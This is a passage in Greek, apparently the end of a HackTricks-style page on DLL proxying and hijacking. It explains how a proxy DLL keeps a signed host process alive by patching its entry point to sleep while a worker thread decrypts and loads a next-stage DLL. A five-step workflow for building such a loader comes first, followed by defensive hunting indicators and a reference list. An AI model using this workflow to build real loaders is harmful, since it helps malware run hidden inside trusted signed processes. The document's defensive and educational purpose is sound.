- Ένα νέο νήμα εκτελεί την πραγματική κακόβουλη εργασία: αποκρυπτογραφεί το όνομα ή τη διαδρομή της DLL επόμενου σταδίου (συχνά χρησιμοποιούνται RC4/XOR) και στη συνέχεια την εκκινεί με `LoadLibrary`.

Γιατί έχει σημασία
- Το συνηθισμένο proxying DLL διατηρεί τη συμβατότητα API, αλλά δεν εγγυάται ότι ο host θα παραμείνει ενεργός αρκετά ώστε να εκτελεστούν τα επόμενα στάδια.
- Η αδρανοποίηση του κύριου νήματος με `Sleep(INFINITE)` είναι ένας απλός τρόπος να παραμείνει η υπογεγραμμένη διεργασία ενεργή, ενώ ο loader εκτελεί αποκρυπτογράφηση, staging ή αρχική σύνδεση δικτύου σε ένα νήμα εργασίας.
- Το hunting μόνο για ύποπτο `DllMain` μπορεί να μην εντοπίσει αυτό το μοτίβο, αν η ενδιαφέρουσα συμπεριφορά ξεκινά μετά την τροποποίηση του σημείου εισόδου του host και την εκκίνηση ενός δεύτερου νήματος.

Ελάχιστη ροή εργασίας
1. Αντέγραψε το υπογεγραμμένο EXE host και προσδιόρισε ποια DLL φορτώνει από τον τοπικό κατάλογο.
2. Δημιούργησε μια proxy DLL που εξάγει τις ίδιες συναρτήσεις και τις προωθεί στη νόμιμη DLL.
3. Στο `DllMain(DLL_PROCESS_ATTACH)`, δημιούργησε ένα νήμα εργασίας.
4. Από αυτό το νήμα, τροποποίησε το σημείο εισόδου του host ή τη ρουτίνα εκκίνησης του κύριου νήματος, ώστε να εκτελεί βρόχο με `Sleep`.
5. Αποκρυπτογράφησε το όνομα/τη ρύθμιση της DLL επόμενου σταδίου και κάλεσε `LoadLibrary` ή κάνε manual-map το payload.

Αμυντικοί δείκτες διερεύνησης
- Υπογεγραμμένες διεργασίες που φορτώνουν `version.dll` ή παρόμοιες κοινές βιβλιοθήκες από τον δικό τους κατάλογο εφαρμογής αντί από το `System32`.
- Τροποποιήσεις μνήμης στο σημείο εισόδου της διεργασίας λίγο μετά τη φόρτωση του image, ειδικά άλματα/κλήσεις που ανακατευθύνονται στο `Sleep`/`SleepEx`.
- Νήματα που δημιουργούνται από proxy DLL και καλούν αμέσως `LoadLibrary` για μια δεύτερη DLL με αποκρυπτογραφημένο όνομα.
- Proxy DLL που προωθούν όλες τις εξαγωγές και τοποθετούνται δίπλα σε εκτελέσιμα προμηθευτών, μέσα σε εγγράψιμους καταλόγους staging όπως `ProgramData`, `%TEMP%` ή διαδρομές αποσυμπιεσμένων αρχείων.

## References

- [1] [Red Canary – Ενημερώσεις πληροφοριών: Ιανουάριος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Κλιμάκωση προνομίων μέσω του TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking στα Windows. Απλό παράδειγμα σε C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Η Nimbus Manticore αναπτύσσει νέο κακόβουλο λογισμικό με στόχο την Ευρώπη](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Όταν τα DLL Hijacks συναντούν τους βοηθούς των Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Ψηφιακοί σωσίες: Ανατομία εξελισσόμενων εκστρατειών πλαστοπροσωπίας που διανέμουν το Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Σύγκλιση συμφερόντων: Ανάλυση ομάδων απειλών που στοχεύουν κυβέρνηση της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Μέσα στον Ink Dragon: Αποκάλυψη του δικτύου αναμετάδοσης και της εσωτερικής λειτουργίας μιας μυστικής επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Το Chrysalis Backdoor: Λεπτομερής ανάλυση του toolkit της Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: αλυσίδα ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Παρακολούθηση των κατασκοπευτικών εκστρατειών του 2026 της ιρανικής APT Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – στοιχείο `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – στοιχείο `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – στοιχείο `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – στοιχείο `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – στοιχείο `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – στοιχείο `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Γρήγοροι και αμείλικτοι: Επιχειρήσεις της Nimbus Manticore κατά τη διάρκεια της ιρανικής σύγκρουσης](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Ενέργειες εργασιών](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – Η CL-STA-1062 στοχεύει κυβερνήσεις και κρίσιμες υποδομές της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
